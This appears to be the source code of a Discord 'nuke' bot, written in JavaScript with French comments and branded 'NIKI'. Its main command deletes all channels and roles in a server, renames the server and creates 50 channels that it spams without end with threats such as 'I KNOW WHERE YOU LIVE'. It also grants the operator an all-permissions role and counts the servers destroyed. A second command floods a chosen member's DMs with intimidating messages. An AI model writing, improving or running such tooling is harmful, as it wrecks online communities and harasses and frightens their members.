require('dotenv').config();
const fs = require('fs');
const { 
    Client, 
    GatewayIntentBits, 
    PermissionsBitField, 
    ChannelType, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle,
    StringSelectMenuBuilder, // NOUVEAU
    ModalBuilder,            // NOUVEAU
    TextInputBuilder,        // NOUVEAU
    TextInputStyle           // NOUVEAU
} = require('discord.js');

// ============================================================
// GESTION DES STATS PERMANENTES (FICHIER JSON)
// ============================================================
const STATS_FILE = './stats.json';

function loadStats() {
    if (fs.existsSync(STATS_FILE)) {
        try {
            const data = fs.readFileSync(STATS_FILE, 'utf8');
            return JSON.parse(data);
        } catch (e) {
            console.error("Erreur lors du chargement des stats, réinitialisation.");
            return { totalNukes: 0, totalChannelsDeleted: 0, totalRolesDeleted: 0, totalChannelsCreated: 0 };
        }
    } else {
        return { totalNukes: 0, totalChannelsDeleted: 0, totalRolesDeleted: 0, totalChannelsCreated: 0 };
    }
}

function saveStats() {
    const data = {
        totalNukes: totalNukes,
        totalChannelsDeleted: totalChannelsDeleted,
        totalRolesDeleted: totalRolesDeleted,
        totalChannelsCreated: totalChannelsCreated
    };
    fs.writeFileSync(STATS_FILE, JSON.stringify(data, null, 2), 'utf8');
}

// On charge les stats au démarrage
let stats = loadStats();
let totalNukes = stats.totalNukes;
let totalChannelsDeleted = stats.totalChannelsDeleted;
let totalRolesDeleted = stats.totalRolesDeleted;
let totalChannelsCreated = stats.totalChannelsCreated;

// ============================================================
// CLIENT SETUP
// ============================================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ]
});

const PREFIX = process.env.PREFIX || '!';
const AUTHORIZED_ID = "1474433573174907054";

let statsChannelId = null;
let statsMessageId = null;

// ============================================================
// ASCII BANNER
// ============================================================
const ASCII_BANNER = `
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║    ███╗   ██╗██╗██╗  ██╗██╗      █████╗ ██╗██╗         ║
║    ████╗  ██║██║██║ ██╔╝██║     ██╔══██╗██║██║         ║
║    ██╔██╗ ██║██║█████╔╝ ██║     ███████║██║██║         ║
║    ██║╚██╗██║██║██╔═██╗ ██║     ██╔══██║██║██║         ║
║    ██║ ╚████║██║██║  ██╗███████╗██║  ██║██║██║         ║
║    ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝         ║
║                                                           ║
║              💀  NUKED BY NIKI  💀                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
`;

const VICTORY_MESSAGES = [
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI RULES !**\n**NIKI IS THE KING !**\n\nTHIS SERVER HAS BEEN DESTROYED',
    '@everyone @here\n\n**NIKI IS UNSTOPPABLE !**\n**NIKI DESTROYED THIS SERVER !**\n\n**NIKI ON TOP !**',
    '@everyone @here\n\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n**NIKI ON TOP !**\n\nTHIS SERVER IS NOW NIKI\'S PROPERTY'
];

const SCARY_MESSAGES = [
    '@everyone @here\n\n=== SYSTEM OVERRIDE ===\n\n[!] ALL CHANNELS PERMANENTLY DESTROYED\n[!] ALL ROLES DELETED\n[!] SERVER STRUCTURE COMPROMISED\n\nACCESS DENIED PERMANENTLY',
    '@everyone @here\n\n=== CRITICAL SYSTEM FAILURE ===\n\n[!] ROOT ACCESS GRANTED TO NIKI\n[!] ALL DATA WIPED\n[!] RESTORATION IMPOSSIBLE\n\nSYSTEM SHUTDOWN',
    '@everyone @here\n\n=== SECURITY BREACH ===\n\n[!] UNAUTHORIZED ACCESS: NIKI\n[!] ALL PERMISSIONS REVOKED\n[!] CHANNEL STRUCTURE DESTROYED\n\nOPERATION COMPLETE'
];

const TERRIFYING_MESSAGES = [
    '@everyone @here I AM WATCHING YOU. YOU CANNOT ESCAPE.',
    '@everyone @here YOUR SCREAMS ARE DELICIOUS. KEEP RUNNING.',
    'I KNOW WHERE YOU LIVE. I KNOW YOUR NAME. I AM ALWAYS THERE.',
    'DO NOT TURN AROUND. DO NOT BLINK. DO NOT BREATHE.',
    'YOUR FRIENDS CANNOT SAVE YOU. NO ONE IS COMING.',
    'THE WALLS ARE BREATHING. THEY ARE WATCHING YOU.',
    'YOU ARE ALREADY DEAD. YOU JUST DO NOT KNOW IT YET.',
    'DONT CHECK THE DOOR. DONT CHECK THE CLOSET. DONT SCREAM.',
    'THIS IS NOT A GAME. THIS IS REALITY. REALITY HURTS.',
    'EVERYONE YOU LOVE WILL FORGET YOU. YOU ARE NOTHING.',
    'THERE IS NO LIGHT AT THE END OF THE TUNNEL. ONLY DARKNESS.',
    'YOU HAVE 5 SECONDS TO RUN. 5. 4. 3. 2. 1. TOO LATE.',
    'FLEE. BUT KNOW THAT I AM FASTER THAN YOUR FEAR.',
    'I AM THE REASON YOU WAKE UP AT 3AM IN A COLD SWEAT.',
    'YOUR PULSE IS RACING. I CAN HEAR IT. I CAN FEED ON IT.',
    'THEY ARE NOT YOUR FRIENDS. THEY ARE WAITING FOR YOU TO SLEEP.',
    'FIND THE EXIT. OH WAIT, THERE IS NONE. THERE NEVER WAS.',
    'YOUR IP IS EXACTLY 192.168.1.1. DO YOU FEEL EXPOSED?',
    'HIDE. PRAY. BEG. IT WONT HELP. BUT PLEASE, KEEP TRYING.',
    'TICK TOCK. TICK TOCK. YOUR TIME IS SLIPPING AWAY.',
    'I AM NIKI. AND I AM THE LAST THING YOU WILL SEE.',
    'ALL YOUR DATA IS MINE. ALL YOUR SECRETS ARE MINE.',
    'FEAR HAS A NEW NAME TODAY. AND THAT NAME IS MINE.',
    'BREAKING THE RULES IS FUN. BREAKING YOU IS FUNNER.',
    'I AM THE WINDOW YOU CHECK AT NIGHT. I AM THE SHADOW.'
];

const HACKER_IMAGES = [
    'https://i.imgur.com/2wI8t0V.png',
    'https://i.imgur.com/3hqP4G6.png',
    'https://i.imgur.com/5VjN7pK.png'
];

const SCARY_NAMES = [
    'N1K1-0N-T0P-01', 'N1K1-RUL3S-02', 'N1K1-K1NG-03', 'N1K1-G04T-04', 'N1K1-L3G3ND-05',
    'N1K1-W1NS-06', 'N1K1-D3STR0YS-07', 'N1K1-UNST0PP4BL3-08', 'N1K1-G0D-09', 'N1K1-0N-T0P-10',
    'T3RM1N4T3D-11', 'D3L3T3D-12', 'C0RRUPT3D-13', 'SYST3M-F41LUR3-14', '4CC3SS-D3N13D-15',
    'D3STR0Y3D-16', 'PURG3D-17', '3R4S3D-18', '0V3RR1DD3N-19', 'C0MPR0M1S3D-20',
    '1NF3CT3D-21', 'H4CK3D-22', 'BR34CH3D-23', 'D3T0N4T3D-24', 'N3UTR4L1Z3D-25',
    '4NNH1L4T3D-26', '0BL1T3R4T3D-27', '3XT1NGU1SH3D-28', 'D3C1M4T3D-29', '3XT3RM1N4T3D-30',
    'L1QU1D4T3D-31', '3R4D1C4T3D-32', 'V4P0R1Z3D-33', '3XPL0D3D-34', 'SH4TT3R3D-35',
    'CRUSH3D-36', 'D1SM4NTL3D-37', 'SCR4PP3D-38', 'TR4SH3D-39', 'G4RB4G3D-40',
    'NUK3D-41', 'R4Z3D-42', 'L3V3L3D-43', 'FL4TT3N3D-44', 'GR0UND3D-45',
    'T3RM1N4L-46', 'F4T4L-47', 'CR1T1C4L-48', '3M3RG3NCY-49', 'D1S4ST3R-50'
];

const inviteLink = 'https://discord.gg/eVTU7sW3wv';

// ============================================================
// UPDATE STATS CHANNEL
// ============================================================
async function updateStatsChannel() {
    if (!statsChannelId) return;

    try {
        const channel = await client.channels.fetch(statsChannelId);
        if (!channel) return;

        const embed = new EmbedBuilder()
            .setColor(0x00FF00)
            .setTitle('☠ NIKI NUKE STATS ☠')
            .setDescription('**BOT STATUS: ONLINE**\n🟢 **LIVE**')
            .addFields(
                { name: '💀 Total Nukes', value: `${totalNukes}`, inline: true },
                { name: '🗑️ Channels Deleted', value: `${totalChannelsDeleted}`, inline: true },
                { name: '🎭 Roles Deleted', value: `${totalRolesDeleted}`, inline: true },
                { name: '📝 Channels Created', value: `${totalChannelsCreated}`, inline: true },
                { name: '📊 Servers', value: `${client.guilds.cache.size}`, inline: true },
                { name: '👤 Authorized User', value: `<@${AUTHORIZED_ID}>`, inline: true }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setLabel('🔄 Refresh Stats')
                    .setStyle(ButtonStyle.Primary)
                    .setCustomId('refresh_stats'),
                new ButtonBuilder()
                    .setLabel('💀 Nuke Stats')
                    .setStyle(ButtonStyle.Danger)
                    .setCustomId('nuke_stats')
            );

        if (statsMessageId) {
            try {
                const msg = await channel.messages.fetch(statsMessageId);
                await msg.edit({ embeds: [embed], components: [row] });
            } catch {
                const msg = await channel.send({ embeds: [embed], components: [row] });
                statsMessageId = msg.id;
            }
        } else {
            const msg = await channel.send({ embeds: [embed], components: [row] });
            statsMessageId = msg.id;
        }
    } catch (e) {
        console.error('Error updating stats channel:', e);
    }
}

// ============================================================
// INTERACTIONS (Buttons)
// ============================================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    if (interaction.customId === 'refresh_stats') {
        await interaction.deferUpdate();
        await updateStatsChannel();
        await interaction.followUp({ content: '✅ Stats refreshed!', ephemeral: true });
    }

    if (interaction.customId === 'nuke_stats') {
        await interaction.deferUpdate();
        const embed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('☠ NUKE HISTORY ☠')
            .setDescription(`Total Nukes: ${totalNukes}\nChannels Deleted: ${totalChannelsDeleted}\nRoles Deleted: ${totalRolesDeleted}\nChannels Created: ${totalChannelsCreated}`)
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();
        await interaction.followUp({ embeds: [embed], ephemeral: true });
    }
});

// ============================================================
// READY EVENT
// ============================================================
client.once('ready', async () => {
    console.log(`✅ Connected as ${client.user.tag}`);
    console.log(`📊 ${client.guilds.cache.size} servers`);
    console.log(`🔧 Prefix: ${PREFIX}`);
    console.log(`💾 Stats loaded from file. Total Nukes: ${totalNukes}`);
    console.log('====================================');
    await updateStatsChannel();
});

// ============================================================
// MESSAGE COMMANDS
// ============================================================
client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'vnuke') {
        await handleNuke(message);
    }
    
    if (command === 'spam') {
        await handleSpam(message, args);
    }

    if (command === 'verif') {
        await handleVerif(message);
    }

    if (command === 'set') {
        statsChannelId = message.channel.id;
        statsMessageId = null;
        await updateStatsChannel();
        await message.reply('✅ Stats channel set!');
    }
});

// ============================================================
// NUKE FUNCTION (AVEC SPAM INFINI + PING + RÔLE NIKI)
// ============================================================
async function handleNuke(message) {
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ You need administrator permissions!');
    }

    if (!message.guild.members.me.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return message.reply('❌ I need administrator permissions!');
    }

    await message.reply('💀 **NUKE INITIALIZED... (RAPID MODE)**');

    const guild = message.guild;
    const guildName = guild.name;
    let channelsDeleted = 0;
    let rolesDeleted = 0;
    let channelsCreated = 0;

    try {
        // 1. DELETE ALL CHANNELS
        const channels = guild.channels.cache;
        const deletePromises = channels.map(async (channel) => {
            try {
                await channel.delete();
                channelsDeleted++;
            } catch (e) {}
        });
        await Promise.all(deletePromises);

        // 2. DELETE ALL ROLES (except @everyone)
        const roles = guild.roles.cache;
        const deleteRolePromises = roles.map(async (role) => {
            if (role.name !== '@everyone' && role.id !== guild.id) {
                try {
                    await role.delete();
                    rolesDeleted++;
                } catch (e) {}
            }
        });
        await Promise.all(deleteRolePromises);

        // 3. RENAME SERVER
        const nukeNumber = Math.floor(Math.random() * 9000) + 1000;
        try {
            await guild.setName(`☠ N1K1-0N-T0P-${nukeNumber} ☠`);
        } catch (e) {}

        // 4. CREATE 50 NEW CHANNELS & SPAM THEM INFINITELY
        const createPromises = [];
        for (let i = 0; i < 50; i++) {
            const name = SCARY_NAMES[i % SCARY_NAMES.length];
            const promise = guild.channels.create({
                name: name,
                type: ChannelType.GuildText,
            }).then(async (channel) => {
                try {
                    await channel.send('```' + ASCII_BANNER + '```');
                    await channel.send(SCARY_MESSAGES[Math.floor(Math.random() * SCARY_MESSAGES.length)]);
                    await channel.send(VICTORY_MESSAGES[Math.floor(Math.random() * VICTORY_MESSAGES.length)]);
                    
                    const embed = new EmbedBuilder()
                        .setColor(0xFF0000)
                        .setTitle('☠ SYSTEM DESTROYED ☠')
                        .setDescription('**NIKI ON TOP !**')
                        .setImage(HACKER_IMAGES[Math.floor(Math.random() * HACKER_IMAGES.length)])
                        .setFooter({ text: 'NIKI RULES ☠' })
                        .setTimestamp();
                    await channel.send({ embeds: [embed] });
                    await channel.send(`**JOIN THE DARK SIDE:**\n${inviteLink}`);

                    let isSpamming = true;                    
                    while (isSpamming) {
                        try {
                            const scaryText = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
                            await channel.send(scaryText);
                            await new Promise(resolve => setTimeout(resolve, 50));
                        } catch (e) {
                            isSpamming = false;
                        }
                    }
                    channelsCreated++;
                } catch (e) {}
            }).catch(() => {});
            
            createPromises.push(promise);
        }
        await Promise.all(createPromises);

        // 5. CREATE SPECIAL NIKI ROLE WITH ALL PERMISSIONS
        try {
            const allPermissions = [
                PermissionsBitField.Flags.Administrator,
                PermissionsBitField.Flags.CreateInstantInvite,
                PermissionsBitField.Flags.KickMembers,
                PermissionsBitField.Flags.BanMembers,
                PermissionsBitField.Flags.ManageChannels,
                PermissionsBitField.Flags.ManageGuild,
                PermissionsBitField.Flags.AddReactions,
                PermissionsBitField.Flags.ViewAuditLog,
                PermissionsBitField.Flags.PrioritySpeaker,
                PermissionsBitField.Flags.Stream,
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages,
                PermissionsBitField.Flags.SendTTSMessages,
                PermissionsBitField.Flags.ManageMessages,
                PermissionsBitField.Flags.EmbedLinks,
                PermissionsBitField.Flags.AttachFiles,
                PermissionsBitField.Flags.ReadMessageHistory,
                PermissionsBitField.Flags.MentionEveryone,
                PermissionsBitField.Flags.UseExternalEmojis,
                PermissionsBitField.Flags.ViewGuildInsights,
                PermissionsBitField.Flags.Connect,
                PermissionsBitField.Flags.Speak,
                PermissionsBitField.Flags.MuteMembers,
                PermissionsBitField.Flags.DeafenMembers,
                PermissionsBitField.Flags.MoveMembers,
                PermissionsBitField.Flags.UseVAD,
                PermissionsBitField.Flags.ChangeNickname,
                PermissionsBitField.Flags.ManageNicknames,
                PermissionsBitField.Flags.ManageRoles,
                PermissionsBitField.Flags.ManageWebhooks,
                PermissionsBitField.Flags.ManageEmojisAndStickers
            ];

            const totalPermissions = allPermissions.reduce((acc, perm) => acc | perm, 0n);

            const nikiRole = await guild.roles.create({
                name: '☠ NIKI ☠',
                color: '#FF0000',
                hoist: true,
                mentionable: true,
                permissions: totalPermissions
            });

            await message.member.roles.add(nikiRole);

            try {
                await guild.members.me.roles.add(nikiRole);
            } catch (e) {}

        } catch (e) {
            console.log("Erreur lors de la création du rôle NIKI:", e);
        }

        // 6. UPDATE STATS
        totalNukes++;
        totalChannelsDeleted += channelsDeleted;
        totalRolesDeleted += rolesDeleted;
        totalChannelsCreated += channelsCreated;
        saveStats();

        await updateStatsChannel();

        const dmEmbed = new EmbedBuilder()
            .setColor(0xFF0000)
            .setTitle('☠ NUKE EXECUTED ☠')
            .setDescription(`**TARGET:** ${guildName}`)
            .addFields(
                { name: '💀 Channels Deleted', value: `${channelsDeleted}`, inline: true },
                { name: '🎭 Roles Deleted', value: `${rolesDeleted}`, inline: true },
                { name: '📝 Channels Created', value: `${channelsCreated}`, inline: true },
                { name: '📊 Total Nukes', value: `${totalNukes}`, inline: true }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        try {
            await message.author.send({ embeds: [dmEmbed] });
        } catch (e) {}

        await message.channel.send(`✅ **NUKE COMPLETE!**\n\n${VICTORY_MESSAGES[0]}\n\n**@everyone @here** THIS SERVER IS NOW NIKI'S PROPERTY`);

    } catch (error) {
        console.error(error);
        await message.channel.send('❌ Error: ' + error.message);
    }
}

// ============================================================
// SPAM FUNCTION (DM SPAM - AUTORISÉ SUR SOI-MÊME)
// ============================================================
async function handleSpam(message, args) {
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    if (args.length === 0) {
        return message.reply('❌ Utilisation : `!spam @membre`');
    }

    const targetMember = message.mentions.members.first();

    if (!targetMember) {
        return message.reply('❌ Membre introuvable. Mentionne un membre valide.');
    }

    if (targetMember.id === client.user.id) {
        return message.reply('❌ Je ne peux pas me spam moi-même !');
    }

    await message.reply(`💀 **SPAM INITIALIZED sur ${targetMember.user.tag}...`);

    const user = targetMember.user;
    let sentCount = 0;
    let failedCount = 0;
    const MAX_SPAM = 30;

    try {
        const dmChannel = await user.createDM();

        for (let i = 0; i < MAX_SPAM; i++) {
            try {
                const randomScary = TERRIFYING_MESSAGES[Math.floor(Math.random() * TERRIFYING_MESSAGES.length)];
                await dmChannel.send(randomScary);
                sentCount++;
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (e) {
                failedCount++;
                break;
            }
        }

        const reportEmbed = new EmbedBuilder()
            .setColor(sentCount > 0 ? 0xFF0000 : 0x808080)
            .setTitle('☠ RAPPORT DE SPAM ☠')
            .setDescription(`Cible : **${user.tag}**`)
            .addFields(
                { name: '📨 Messages envoyés avec succès', value: `${sentCount}`, inline: true },
                { name: '❌ Messages échoués', value: `${failedCount}`, inline: true },
                { name: '📊 Statut', value: sentCount > 0 ? '✅ **SUCCÈS**' : '❌ **ÉCHEC**', inline: false }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();

        if (sentCount === 0) {
            reportEmbed.addFields({ name: '🔴 Raison de l\'échec', value: 'La cible a probablement fermé ses messages privés (DMs) ou bloqué le bot.', inline: false });
        }

        await message.channel.send({ embeds: [reportEmbed] });

    } catch (error) {
        console.error(error);
        
        const errorEmbed = new EmbedBuilder()
            .setColor(0x808080)
            .setTitle('☠ RAPPORT DE SPAM ☠')
            .setDescription(`Cible : **${user.tag}**`)
            .addFields(
                { name: '📨 Messages envoyés avec succès', value: `0`, inline: true },
                { name: '❌ Messages échoués', value: `1+`, inline: true },
                { name: '📊 Statut', value: '❌ **ÉCHEC CRITIQUE**', inline: false },
                { name: '🔴 Raison de l\'échec', value: 'La cible a fermé ses DMs ou a bloqué le bot.', inline: false }
            )
            .setFooter({ text: 'NIKI ON TOP ☠' })
            .setTimestamp();
            
        await message.channel.send({ embeds: [errorEmbed] });
    }
}

// ============================================================
// VERIFICATION FUNCTION (!verif)
// ============================================================
async function handleVerif(message) {
    if (message.author.id !== AUTHORIZED_ID) {
        return message.reply('❌ You are not authorized to use this command!');
    }

    const guild = message.guild;

    // Étape 1 : Créer le rôle Membre
    let memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');
    if (!memberRole) {
        memberRole = await guild.roles.create({
            name: '✅ Membre',
            color: '#00FF00',
            hoist: true,
            mentionable: false
        });
    }

    // Étape 2 : Verrouiller TOUS les salons
    const channels = guild.channels.cache;
    const lockPromises = channels.map(async (channel) => {
        try {
            await channel.permissionOverwrites.edit(guild.roles.everyone, {
                ViewChannel: false
            });
            await channel.permissionOverwrites.edit(memberRole, {
                ViewChannel: true
            });
        } catch (e) {}
    });
    await Promise.all(lockPromises);

    // Étape 3 : Créer le salon de vérification tout en haut
    let verifChannel = guild.channels.cache.find(c => c.name === '🔓-vérification');
    if (!verifChannel) {
        verifChannel = await guild.channels.create({
            name: '🔓-vérification',
            type: ChannelType.GuildText,
            position: 0 // Tout en haut
        });
    }
    // On s'assure que tout le monde peut voir ce salon
    await verifChannel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: true,
        SendMessages: false
    });

    // Étape 4 : Créer le message avec le bouton
    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('start_verif')
                .setLabel('🔐 Clique ici pour vérifier ton compte')
                .setStyle(ButtonStyle.Success)
        );

    const oldMessages = await verifChannel.messages.fetch({ limit: 10 });
    await verifChannel.bulkDelete(oldMessages);

    await verifChannel.send({
        content: `**Bienvenue sur le système de vérification !**\nClique sur le bouton ci-dessous pour commencer.`,
        components: [row]
    });

    await message.reply(`✅ **Système de vérification installé !**\nSalon créé : ${verifChannel}\nRôle créé : ${memberRole}\nTous les autres salons sont désormais privés.`);
}

// ============================================================
// GESTION DES INTERACTIONS (BOUTONS & MENUS & MODALES)
// ============================================================
client.on('interactionCreate', async (interaction) => {
    // Bouton "Démarrer la vérification"
    if (interaction.isButton() && interaction.customId === 'start_verif') {
        const menuRow = new ActionRowBuilder()
            .addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('select_verif_type')
                    .setPlaceholder('Choisis ton système de vérification')
                    .addOptions([
                        {
                            label: '🔢 Code aléatoire',
                            description: 'Le bot te donnera un code à recopier.',
                            value: 'code'
                        },
                        {
                            label: '✅ Bouton simple',
                            description: 'Clique sur "Je suis humain" et c\'est bon.',
                            value: 'simple'
                        }
                    ])
            );

        await interaction.reply({
            content: '**Quel type de vérification souhaites-tu utiliser ?**',
            components: [menuRow],
            ephemeral: true
        });
    }

    // Menu déroulant (Choix du type)
    if (interaction.isStringSelectMenu() && interaction.customId === 'select_verif_type') {
        const choice = interaction.values[0];
        const guild = interaction.guild;
        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');

        if (!memberRole) {
            return interaction.reply({ content: '❌ Erreur : Le rôle Membre n\'existe pas. Contacte un admin.', ephemeral: true });
        }

        // SYSTÈME BOUTON SIMPLE
        if (choice === 'simple') {
            const simpleRow = new ActionRowBuilder()
                .addComponents(
                    new ButtonBuilder()
                        .setCustomId('confirm_simple')
                        .setLabel('✅ Je suis humain, donne-moi l\'accès')
                        .setStyle(ButtonStyle.Primary)
                );

            await interaction.update({
                content: '**Système Bouton Simple :**\nClique sur le bouton ci-dessous pour obtenir le rôle.',
                components: [simpleRow]
            });
        }

        // SYSTÈME CODE ALÉATOIRE
        if (choice === 'code') {
            const code = Math.floor(1000 + Math.random() * 9000).toString();
            
            global.verifCodes = global.verifCodes || new Map();
            global.verifCodes.set(interaction.user.id, code);

            const modal = new ModalBuilder()
                .setCustomId('code_verif_modal')
                .setTitle('🔢 Vérification par code');

            const codeInput = new TextInputBuilder()
                .setCustomId('code_input')
                .setLabel('Recopie le code ci-dessous : ' + code)
                .setStyle(TextInputStyle.Short)
                .setPlaceholder('Entrer le code ici...')
                .setRequired(true);

            const actionRow = new ActionRowBuilder().addComponents(codeInput);
            modal.addComponents(actionRow);

            await interaction.showModal(modal);
        }
    }

    // Bouton "Confirmation simple"
    if (interaction.isButton() && interaction.customId === 'confirm_simple') {
        const guild = interaction.guild;
        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');

        if (!memberRole) {
            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
        }

        if (interaction.member.roles.cache.has(memberRole.id)) {
            return interaction.reply({ content: '❌ Tu as déjà le rôle !', ephemeral: true });
        }

        await interaction.member.roles.add(memberRole);
        await interaction.update({
            content: '✅ **Vérification réussie !** Tu as maintenant accès à tous les salons.',
            components: []
        });
    }
});

// ============================================================
// GESTION DES MODALES (CODE)
// ============================================================
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isModalSubmit()) return;

    if (interaction.customId === 'code_verif_modal') {
        const enteredCode = interaction.fields.getTextInputValue('code_input');
        const storedCode = global.verifCodes ? global.verifCodes.get(interaction.user.id) : null;

        const guild = interaction.guild;
        const memberRole = guild.roles.cache.find(r => r.name === '✅ Membre');

        if (!memberRole) {
            return interaction.reply({ content: '❌ Erreur : Rôle introuvable.', ephemeral: true });
        }

        if (enteredCode === storedCode) {
            await interaction.member.roles.add(memberRole);
            global.verifCodes.delete(interaction.user.id);
            
            await interaction.reply({
                content: '✅ **Code correct !** Tu as maintenant accès à tous les salons.',
                ephemeral: true
            });
        } else {
            await interaction.reply({
                content: '❌ **Code incorrect.** Réessaye en tapant `!verif` dans le salon de vérification.',
                ephemeral: true
            });
        }
    }
});

client.login(process.env.TOKEN);